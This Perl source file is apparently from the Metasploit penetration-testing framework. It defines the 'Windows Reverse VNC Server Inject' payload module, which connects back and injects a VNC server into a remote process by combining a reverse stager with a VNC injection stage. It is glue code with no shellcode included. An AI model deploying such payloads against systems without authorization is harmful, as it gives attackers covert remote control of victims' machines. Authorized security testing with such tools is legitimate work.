
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_vncinject;
use strict;
use base 'Msf::PayloadComponent::Windows::ia32::InjectVncStage';
use FindBin qw{$RealBin};

my $info =
{
	'Name'         => 'Windows Reverse VNC Server Inject',
	'Version'      => '$Revision$',
	'Description'  => 'Connect back and inject a VNC server into the remote process',
};

sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::InjectVncStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseStager');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

1;
